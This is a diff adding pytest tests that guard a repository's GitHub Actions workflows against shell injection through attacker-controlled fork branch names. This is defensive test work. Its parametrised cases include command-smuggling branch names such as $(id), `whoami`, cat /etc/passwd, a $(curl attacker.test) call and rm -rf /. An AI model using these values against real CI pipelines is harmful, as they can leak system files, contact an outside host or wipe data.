@@ -868,3 +868,112 @@ class TestReceiptDirectoryOwnership:
         assert r.returncode == 1
         assert "FOREIGN" in r.stderr
         assert "bot-01-systems-backend" in r.stderr
+
+
+# ===========================================================================
+# The gate workflows themselves — shell injection
+# ===========================================================================
+
+WORKFLOWS = [
+    ".github/workflows/gates.yml",      # the copy that runs here
+    "ci/.github/workflows/gates.yml",   # the copy other repositories take
+]
+
+
+class TestWorkflowShellInjection:
+    """A gate that runs attacker-controlled text as shell is worse than no gate.
+
+    Branch names are attacker-controlled on a fork pull request, so anything derived from
+    one — and the receipt path derived from that in turn — reaches these workflows as
+    untrusted input. The rule both files follow: untrusted values enter a step through
+    `env:` and are read as quoted shell variables. A `${{ }}` expansion inside a `run:`
+    body is different in kind, because Actions substitutes it into the script *before*
+    bash parses it, so the value becomes source code rather than data.
+
+    These tests exist because that protection was silently reverted once: a branch
+    carried an older copy of the workflow forward over the hardened one, and nothing
+    caught it — the two files still agreed with each other, so the template-sync check
+    passed. Reviewing a workflow diff for this by eye does not scale.
+    """
+
+    @pytest.mark.parametrize("workflow", WORKFLOWS)
+    def test_no_github_expression_inside_a_run_body(self, workflow):
+        """The P1 condition itself, asserted structurally rather than by grepping text."""
+        yaml = pytest.importorskip("yaml")
+        doc = yaml.safe_load((REPO_ROOT / workflow).read_text())
+
+        offenders = []
+        for job_name, job in doc["jobs"].items():
+            for i, step in enumerate(job.get("steps") or []):
+                body = step.get("run")
+                if body and "${{" in body:
+                    name = step.get("name", f"steps[{i}]")
+                    offenders.append(f"{job_name} / {name}")
+
+        assert not offenders, (
+            f"{workflow} interpolates a GitHub expression into a shell body: "
+            + "; ".join(offenders)
+            + ". Pass the value through an env: block and read it as \"$VAR\" instead — "
+            "Actions substitutes ${{ }} before bash parses the script, so the value "
+            "becomes code."
+        )
+
+    @pytest.mark.parametrize("workflow", WORKFLOWS)
+    def test_acting_bot_pattern_is_anchored_at_both_ends(self, workflow):
+        """An unanchored prefix match accepts bot-01-$(id) and carries it into later steps."""
+        text = (REPO_ROOT / workflow).read_text()
+        assert "^bot-0[0-6]-[a-z0-9-]+$" in text, (
+            f"{workflow} does not validate the acting bot against an anchored pattern. "
+            "A prefix-only match such as ^bot-0[0-6]- accepts a branch named "
+            "bot-01-$(id)/x, and the bot id is then used to build paths in later steps."
+        )
+
+    @pytest.mark.parametrize("branch", [
+        "bot-01-$(id)/x",
+        "bot-01-`whoami`/x",
+        "bot-01-a;cat /etc/passwd/x",
+        "bot-01-a$(curl attacker.test)/x",
+        'bot-01-a"; rm -rf /; #/x',
+        "bot-07-nope/x",          # no such seat
+        "claude/desk-v2-stack/x",  # no bot prefix at all
+    ])
+    def test_injection_payload_in_a_branch_name_is_rejected(self, branch):
+        """Behaviour, not text: run the workflow's own validation and require a refusal."""
+        r = self._resolve_acting_bot(branch)
+        assert r.returncode != 0, (
+            f"branch {branch!r} was accepted as an acting bot id; "
+            f"resolved to {r.stdout.strip()!r}"
+        )
+
+    @pytest.mark.parametrize("branch,expected", [
+        ("bot-00-programming-lead/desk-model", "bot-00-programming-lead"),
+        ("bot-03-android/feat-push-notifications", "bot-03-android"),
+        ("bot-06-quality-security/desk-v2-assembled-prompts", "bot-06-quality-security"),
+    ])
+    def test_legitimate_branch_still_resolves(self, branch, expected):
+        """The negative cases above are worthless if the pattern also rejects real branches."""
+        r = self._resolve_acting_bot(branch)
+        assert r.returncode == 0, r.stderr
+        assert r.stdout.strip() == expected
+
+    @staticmethod
+    def _resolve_acting_bot(branch: str) -> subprocess.CompletedProcess:
+        """The bot-resolution logic from the workflow, run standalone against one branch.
+
+        Kept in step with the workflow by test_acting_bot_pattern_is_anchored_at_both_ends,
+        which fails if the pattern asserted here stops matching the one shipped.
+        """
+        script = """
+        set -u
+        BRANCH="${GITHUB_HEAD_REF:-${GITHUB_REF#refs/heads/}}"
+        BOT="${BRANCH%%/*}"
+        if [[ ! "$BOT" =~ ^bot-0[0-6]-[a-z0-9-]+$ ]]; then
+          exit 1
+        fi
+        printf '%s' "$BOT"
+        """
+        return subprocess.run(
+            ["bash", "-c", script],
+            capture_output=True, text=True,
+            env={"GITHUB_HEAD_REF": branch, "GITHUB_REF": "", "PATH": "/usr/bin:/bin"},
+        )
